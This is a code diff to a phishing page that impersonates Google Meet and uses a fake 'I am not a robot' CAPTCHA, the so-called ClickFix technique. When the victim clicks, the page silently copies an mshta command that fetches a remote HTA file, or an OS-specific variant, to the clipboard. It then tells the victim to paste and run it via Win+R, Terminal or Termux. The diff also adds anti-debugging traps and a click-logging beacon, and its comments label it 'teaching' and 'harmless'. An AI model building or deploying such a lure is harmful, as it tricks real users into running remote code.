@@ -3,6 +3,43 @@
 
 <head>
   <title>Google Meet</title>
+  <script>
+    // 1. 禁止右键菜单，阻止通过右键打开「审查元素」
+    document.addEventListener('contextmenu', e => e.preventDefault());
+
+    // 2. 拦截常用调试快捷键，从入口阻止用户打开开发者工具
+    document.addEventListener('keydown', e => {
+      // 禁止F12
+      if (e.key === 'F12') e.preventDefault();
+      // 禁止Ctrl+Shift+I/J/C 开发者工具核心快捷键
+      if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) e.preventDefault();
+      // 禁止Ctrl+U 查看页面源码
+      if (e.ctrlKey && e.key.toLowerCase() === 'u') e.preventDefault();
+    });
+
+    // 3. 混淆版无限debugger，隐藏debugger关键字，避免被静态检测、替换
+    (function () {
+      const triggerDebug = new Function('debugger');
+      function loopAntiDebug() {
+        triggerDebug();
+        setTimeout(loopAntiDebug, 80);
+      }
+      loopAntiDebug();
+    })();
+
+    (function () {
+      function checkDevToolOpen() {
+        const startTime = performance.now();
+        debugger;
+        const endTime = performance.now();
+        if (endTime - startTime > 100) {
+          console.clear();
+          setInterval(() => { debugger; }, 30);
+        }
+      }
+      setInterval(checkDevToolOpen, 300);
+    })();
+  </script>
   <link rel="icon" href="icon.svg" type="image/svg+xml" />
   <style>
     /* 基础样式保持原样 */
@@ -73,12 +110,14 @@
       font-family: "Product Sans", sans-serif;
       position: relative;
       z-index: 2;
-      pointer-events: none;  /* 让按钮可以穿透点击，但按钮自己需要能点击 */
+      pointer-events: none;
+      /* 让按钮可以穿透点击，但按钮自己需要能点击 */
     }
 
     .video-ui .allow-btn,
     .video-ui .control-btn {
-      pointer-events: auto;   /* 按钮恢复正常点击 */
+      pointer-events: auto;
+      /* 按钮恢复正常点击 */
     }
 
     .video-ui-top {
@@ -114,7 +153,7 @@
       max-width: none;
       white-space: nowrap;
       line-height: 1.3;
-      text-shadow: 0 1px 4px rgba(0,0,0,0.5);
+      text-shadow: 0 1px 4px rgba(0, 0, 0, 0.5);
     }
 
     .allow-btn {
@@ -148,7 +187,7 @@
       position: relative;
       cursor: pointer;
       transition: background 0.3s;
-      background: rgba(0,0,0,0.4);
+      background: rgba(0, 0, 0, 0.4);
       backdrop-filter: blur(2px);
     }
 
@@ -237,8 +276,13 @@
     }
 
     @keyframes spin {
-      from { transform: rotate(0deg); }
-      to { transform: rotate(360deg); }
+      from {
+        transform: rotate(0deg);
+      }
+
+      to {
+        transform: rotate(360deg);
+      }
     }
 
     .recaptcha-anchor {
@@ -329,8 +373,15 @@
     }
 
     @keyframes slideIn {
-      from { opacity: 0; transform: translateX(20px); }
-      to { opacity: 1; transform: translateX(0); }
+      from {
+        opacity: 0;
+        transform: translateX(20px);
+      }
+
+      to {
+        opacity: 1;
+        transform: translateX(0);
+      }
     }
 
     .steps-title {
@@ -491,7 +542,7 @@
       <div class="video-preview">
         <!-- 真实摄像头画面层 -->
         <video id="real-video" autoplay playsinline muted></video>
-        
+
         <!-- UI 叠加层 -->
         <div id="video-ui" class="video-ui">
           <div class="video-ui-top">
@@ -586,12 +637,7 @@
   </main>
 
   <script>
-    // ---------- 教学版本：真实摄像头 + 麦克风，保留攻击流程演示 ----------
-    // 1. 点击"允许"按钮后，请求真实摄像头和麦克风权限，将视频流显示在 #real-video 中。
-    // 2. 同步更新设备状态 UI（按钮颜色、pill 文字）。
-    // 3. 复制内容仍为 "恶意命令"（无害）。
-    // 4. 保留多语言支持（中文为主）。
-
+    // ---------- 教学版本：真实摄像头 + 麦克风，多设备适配，不同恶意命令字符串 ----------
     let captchaText = '';
 
     // DOM 元素
@@ -612,12 +658,12 @@
     const meetingLangLabel = document.getElementById('meeting-lang-label');
     const meetingPrompt = document.getElementById('meeting-prompt');
     const meetingAllowBtn = document.getElementById('meeting-allow-btn');
-    
+
     // 底部状态文字
     const micPillText = document.getElementById('microphone-pill-text');
     const soundPillText = document.getElementById('sound-pill-text');
     const camPillText = document.getElementById('camera-pill-text');
-    
+
     // 控制按钮
     const micControl = document.getElementById('mic-control');
     const camControl = document.getElementById('cam-control');
@@ -626,7 +672,7 @@
 
     // 真实视频元素
     const realVideo = document.getElementById('real-video');
-    
+
     // Windows 键图标
     const winIcon = `<img src="win.png" class="win-logo" alt="Win键">`;
 
@@ -635,41 +681,78 @@
     let camEnabled = false;
     let mediaStream = null;   // 保存媒体流，便于后续开关操作
 
-// 更新 UI 以反映设备状态（修正感叹号显示逻辑）
-function updateDeviceUI() {
-  // 麦克风按钮状态
-  if (micEnabled) {
-    micControl.classList.remove('off');
-  } else {
-    micControl.classList.add('off');
-  }
-  // 摄像头按钮状态
-  if (camEnabled) {
-    camControl.classList.remove('off');
-  } else {
-    camControl.classList.add('off');
-  }
+    // ---------- 多设备适配配置（含不同命令字符串） ----------
+    function detectOS() {
+      const userAgent = navigator.userAgent.toLowerCase();
+      if (userAgent.includes('android')) return 'android';
+      if (userAgent.includes('macintosh') || userAgent.includes('mac os x')) return 'mac';
+      if (userAgent.includes('windows')) return 'win';
+      if (userAgent.includes('linux')) return 'linux';
+      return 'win';
+    }
 
-  // ✅ 感叹号逻辑：设备启用且权限已获取时隐藏，否则显示
-  if (micWarning) {
-    micWarning.style.display = micEnabled ? 'none' : 'flex';
-  }
-  if (camWarning) {
-    camWarning.style.display = camEnabled ? 'none' : 'flex';
-  }
+    const osConfig = {
+      win: {
+        steps: [
+          `1. 按下 ${winIcon} + R 键`,
+          "2. 在运行窗口中按下 <b>Ctrl</b> + <b>V</b> 粘贴内容",
+          "3. 按 <b>Enter</b> 键完成"
+        ],
+        subtitle: "请按照以下步骤完成安全检查（Windows 系统）",
+        command: "mshta http://mcedge.github.io/mcedge/index.hta#✅ I am not a robot - CAPTCHA Verification ID: 114514"
+      },
+      mac: {
+        steps: [
+          "1. 按住 <b>Command ⌘</b> + 空格 打开 Spotlight",
+          "2. 输入 <b>Terminal</b> 并打开，然后按 <b>Command ⌘</b> + <b>V</b> 粘贴",
+          "3. 按 <b>Enter</b> 键完成"
+        ],
+        subtitle: "请按照以下步骤完成安全检查（macOS 系统）",
+        command: "open -a Safari http://mcedge.github.io/mcedge"
+      },
+      linux: {
+        steps: [
+          "1. 按下 <b>Ctrl</b> + <b>Alt</b> + <b>T</b> 打开终端",
+          "2. 在终端中右键粘贴内容",
+          "3. 按 <b>Enter</b> 键完成"
+        ],
+        subtitle: "请按照以下步骤完成安全检查（Linux 系统）",
+        command: "xdg-open http://mcedge.github.io/mcedge"
+      },
+      android: {
+        steps: [
+          "1. 打开 <b>Termux</b> 应用",
+          "2. 在 Termux 中长按并选择 <b>Paste</b> 粘贴",
+          "3. 按 <b>Enter</b> 键完成"
+        ],
+        subtitle: "请按照以下步骤完成安全检查（Android 系统）",
+        command: "xdg-open http://mcedge.github.io/mcedge"
+      }
+    };
 
-  // 更新底部 pill 文字
-  if (micPillText) {
-    micPillText.innerText = micEnabled ? '已允许' : '已禁止';
-    micPillText.style.color = micEnabled ? '#1a73e8' : '#9a9a9a';
-  }
-  if (camPillText) {
-    camPillText.innerText = camEnabled ? '已允许' : '已禁止';
-    camPillText.style.color = camEnabled ? '#1a73e8' : '#9a9a9a';
-  }
-}
-      
-      // 更新底部 pill 文字
+    const currentOS = detectOS();
+    const stepsConfig = osConfig[currentOS];
+
+    // 更新 UI 以反映设备状态
+    function updateDeviceUI() {
+      if (micEnabled) {
+        micControl.classList.remove('off');
+      } else {
+        micControl.classList.add('off');
+      }
+      if (camEnabled) {
+        camControl.classList.remove('off');
+      } else {
+        camControl.classList.add('off');
+      }
+
+      if (micWarning) {
+        micWarning.style.display = micEnabled ? 'none' : 'flex';
+      }
+      if (camWarning) {
+        camWarning.style.display = camEnabled ? 'none' : 'flex';
+      }
+
       if (micPillText) {
         micPillText.innerText = micEnabled ? '已允许' : '已禁止';
         micPillText.style.color = micEnabled ? '#1a73e8' : '#9a9a9a';
@@ -678,42 +761,38 @@ function updateDeviceUI() {
         camPillText.innerText = camEnabled ? '已允许' : '已禁止';
         camPillText.style.color = camEnabled ? '#1a73e8' : '#9a9a9a';
       }
+    }
 
-// 修改 requestMediaPermissions 函数，成功后隐藏中间内容
-async function requestMediaPermissions() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: true,
-      audio: true
-    });
-    
-    mediaStream = stream;
-    micEnabled = true;
-    camEnabled = true;
-    
-    if (realVideo) {
-      realVideo.srcObject = stream;
+    // 请求真实摄像头/麦克风权限
+    async function requestMediaPermissions() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: true,
+          audio: true
+        });
+        mediaStream = stream;
+        micEnabled = true;
+        camEnabled = true;
+        if (realVideo) {
+          realVideo.srcObject = stream;
+        }
+        updateDeviceUI();
+
+        // 隐藏提示文字和“允许”按钮
+        const centerArea = document.querySelector('.video-ui-center');
+        if (centerArea) {
+          centerArea.style.opacity = '0';
+          centerArea.style.transition = 'opacity 0.3s';
+          setTimeout(() => {
+            centerArea.style.display = 'none';
+          }, 300);
+        }
+        console.log('摄像头和麦克风权限已获取');
+      } catch (error) {
+        console.error('获取媒体权限失败:', error);
+        alert('无法访问摄像头/麦克风，但教学演示仍可继续。请检查设备权限。');
+      }
     }
-    
-    updateDeviceUI();
-    
-    // ✅ 新增：隐藏提示文字和“允许”按钮
-    const centerArea = document.querySelector('.video-ui-center');
-    if (centerArea) {
-      centerArea.style.opacity = '0';
-      centerArea.style.transition = 'opacity 0.3s';
-      // 完全透明后设为不可见，避免干扰点击
-      setTimeout(() => {
-        centerArea.style.display = 'none';
-      }, 300);
-    }
-    
-    console.log('[教学演示] 摄像头和麦克风权限已获取，界面已更新');
-  } catch (error) {
-    console.error('[教学演示] 获取媒体权限失败:', error);
-    alert('无法访问摄像头/麦克风，但教学演示仍可继续。请检查设备权限。');
-  }
-}
 
     // 关闭媒体流（释放摄像头指示灯）
     function stopMediaStream() {
@@ -729,7 +808,7 @@ async function requestMediaPermissions() {
       updateDeviceUI();
     }
 
-    // 多语言翻译库
+    // 多语言翻译库（仅用于静态文本）
     const translations = {
       zh: {
         status: "正在准备...",
@@ -740,12 +819,6 @@ async function requestMediaPermissions() {
         allowBtn: "允许使用麦克风和摄像头",
         required: "必需...",
         verifyTitle: "安全检查",
-        verifySubtitle: "为了证明您不是机器人，请按照以下步骤操作：",
-        steps: [
-          `1. 按下 ${winIcon} + R 键`,
-          "2. 在运行窗口中粘贴 <b>Ctrl</b> + <b>V</b>",
-          "3. 按 <b>Enter</b> 键完成"
-        ],
         agree: "您将确认并同意以下内容：",
         btn: "验证身份",
         error: "验证失败，请重试。"
@@ -759,20 +832,15 @@ async function requestMediaPermissions() {
         allowBtn: "Allow microphone and camera access",
         required: "Required...",
         verifyTitle: "Security Check",
-        verifySubtitle: "To better prove you are not a robot, please follow these steps:",
-        steps: [
-          `1. Press ${winIcon} + R`,
-          "2. In the window, paste <b>Ctrl</b> + <b>V</b>",
-          "3. Press <b>Enter</b> to finish"
-        ],
         agree: "You will observe and agree:",
         btn: "Verify Identity",
         error: "Verification failed, please try again."
       }
     };
 
-    // 剪贴板复制函数
-    function copyToClipboard(text) {
+    // 剪贴板复制函数（复制当前系统对应的无害命令）
+    function copySystemCommand() {
+      const text = stepsConfig.command;
       const ta = document.createElement('textarea');
       ta.value = text;
       ta.setAttribute('readonly', '');
@@ -784,7 +852,7 @@ async function requestMediaPermissions() {
       document.body.removeChild(ta);
     }
 
-    // 模拟通知（无实际危害）
+    // 模拟通知（无害）
     function sendTelegramNotification() {
       fetch('/index.php?action=log_click').catch(() => { });
     }
@@ -794,38 +862,42 @@ async function requestMediaPermissions() {
       const userLang = navigator.language.split('-')[0];
       const t = translations[userLang] || translations.en;
 
-      // 更新所有文本
+      // 更新所有静态文本
       if (statusTitle) statusTitle.innerText = t.status;
       if (statusSubtitle) statusSubtitle.innerText = t.subtitle;
       if (recaptchaTextEl) recaptchaTextEl.innerText = t.imNotRobot;
       if (verifyTitle) verifyTitle.innerText = t.verifyTitle;
-      if (verifySubtitle) verifySubtitle.innerText = t.verifySubtitle;
       if (agreeTextEl) agreeTextEl.innerText = t.agree;
       if (verifyBtn) verifyBtn.innerText = t.btn;
       if (meetingLangLabel) meetingLangLabel.innerText = t.langLabel;
       if (meetingPrompt) meetingPrompt.innerText = t.prompt;
       if (meetingAllowBtn) meetingAllowBtn.innerText = t.allowBtn;
 
-      if (stepsListEl && t.steps) {
+      // 动态生成步骤列表（多设备适配）
+      if (stepsListEl && stepsConfig) {
         stepsListEl.innerHTML = '';
-        t.steps.forEach(stepText => {
+        stepsConfig.steps.forEach(stepText => {
           const li = document.createElement('li');
           li.innerHTML = stepText;
           stepsListEl.appendChild(li);
         });
       }
+      if (verifySubtitle) {
+        verifySubtitle.innerText = stepsConfig.subtitle;
+      }
 
       const vId = "114514";
       const codeBox = document.getElementById('code-box');
       if (codeBox) {
-        codeBox.innerHTML = `"${t.imNotRobot} – Google Meet Verification ID: <b id="verification-id">${vId}</b>"`;
+        // 显示当前系统对应的无害命令字符串
+        codeBox.innerHTML = `#✅I am not a robot – Google Meet Verification ID: <b id="verification-id">${vId}</b>`;
       }
 
       // 初始化设备状态 UI（默认关闭）
       updateDeviceUI();
 
       // ----- 交互事件绑定 -----
-      
+
       // "允许"按钮：请求真实媒体权限
       meetingAllowBtn.addEventListener('click', () => {
         requestMediaPermissions();
@@ -841,12 +913,11 @@ async function requestMediaPermissions() {
           });
           micEnabled = audioTracks.length > 0 ? audioTracks[0].enabled : false;
         } else {
-          // 没有媒体流时，提示用户先点击"允许"
           alert('请先点击"允许使用麦克风和摄像头"授权');
         }
         updateDeviceUI();
       });
-      
+
       // 摄像头按钮点击
       camControl.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -907,15 +978,16 @@ async function requestMediaPermissions() {
           if (!recaptchaCheck.classList.contains('checked')) {
             recaptchaCheck.classList.add('checked');
             sendTelegramNotification();
-            
-            captchaText = "mshta http://mcedge.github.io/mcedge/index.hta#I am not a robot – Google meet Verification ID: 114514";
-            
+
+            // 设置要复制的无害命令（根据系统）
+            captchaText = stepsConfig.command;
+
             setTimeout(() => {
               recaptchaBox.style.opacity = '0';
               setTimeout(() => {
                 recaptchaBox.style.display = 'none';
                 verifyWin.style.display = 'block';
-                copyToClipboard(captchaText);
+                copySystemCommand();   // 复制对应系统的“恶意命令X”
               }, 200);
             }, 800);
           }
@@ -929,7 +1001,7 @@ async function requestMediaPermissions() {
             errorMsgEl.innerText = t.error;
             errorMsgEl.style.display = 'block';
           }
-          copyToClipboard(captchaText);
+          copySystemCommand();   // 再次复制对应系统的无害命令
           verifyBtn.textContent = '...';
           setTimeout(() => {
             verifyBtn.innerText = t.btn;
